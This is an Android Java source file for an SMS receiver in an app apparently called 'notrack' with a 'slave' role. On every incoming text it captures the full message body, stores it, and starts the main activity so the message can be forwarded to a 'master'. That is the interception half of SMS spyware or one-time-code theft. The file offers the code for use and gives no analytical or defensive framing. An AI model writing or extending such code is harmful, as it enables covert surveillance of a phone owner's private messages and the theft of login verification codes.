package io.notrack.slave;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.provider.Telephony;
import android.telephony.SmsMessage;
import android.widget.Toast;

public class SmsReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context c, Intent i) {
        SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
        if (msgs != null && msgs.length > 0) {
            StringBuilder sb = new StringBuilder();
            for (SmsMessage m : msgs) sb.append(m.getMessageBody());
            // Forward every single SMS to master immediately
            c.getSharedPreferences("slave", 0).edit().putString("last_sms", sb.toString()).apply();
            // Trigger MainActivity to send to master
            Intent intent = new Intent(c, MainActivity.class);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            c.startActivity(intent);
        }
    }
}